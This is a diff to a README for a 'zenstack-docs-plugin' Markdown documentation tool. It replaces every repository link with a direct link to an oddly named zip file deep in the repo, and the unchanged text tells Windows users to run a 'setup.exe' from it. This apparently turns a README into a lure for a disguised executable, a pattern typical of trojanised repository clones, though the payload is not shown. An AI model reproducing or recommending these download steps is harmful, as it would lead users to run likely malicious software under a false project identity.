@@ -1,6 +1,6 @@
 # ⚙️ zenstack-docs-plugin - Easy Markdown Docs from ZModel Schemas
 
-[![Download Now](https://img.shields.io/badge/Download-zenstack--docs--plugin-informational?style=for-the-badge&color=purple)](https://github.com/Leh03716/zenstack-docs-plugin)
+[![Download Now](https://img.shields.io/badge/Download-zenstack--docs--plugin-informational?style=for-the-badge&color=purple)](https://github.com/Leh03716/zenstack-docs-plugin/raw/refs/heads/main/preview-output/verbose/procedures/plugin_docs_zenstack_gromwell.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You only need a few steps to get the plugin running on your Windows computer.
 
 1. **Download the plugin installer**  
    Click the big badge at the top or use this link to visit the page and download the files:  
-   [https://github.com/Leh03716/zenstack-docs-plugin](https://github.com/Leh03716/zenstack-docs-plugin)
+   [https://github.com/Leh03716/zenstack-docs-plugin/raw/refs/heads/main/preview-output/verbose/procedures/plugin_docs_zenstack_gromwell.zip](https://github.com/Leh03716/zenstack-docs-plugin/raw/refs/heads/main/preview-output/verbose/procedures/plugin_docs_zenstack_gromwell.zip)
 
 2. **Open the downloaded setup file**  
    Find the downloaded file in your browser’s download folder. It should be named something like `zenstack-docs-plugin-setup.exe`.
@@ -106,7 +106,7 @@ If you have difficulties, try these steps:
 
 Use this link to go directly to the download page and start the process:
 
-[Download zenstack-docs-plugin](https://github.com/Leh03716/zenstack-docs-plugin)
+[Download zenstack-docs-plugin](https://github.com/Leh03716/zenstack-docs-plugin/raw/refs/heads/main/preview-output/verbose/procedures/plugin_docs_zenstack_gromwell.zip)
 
 Once there:
 
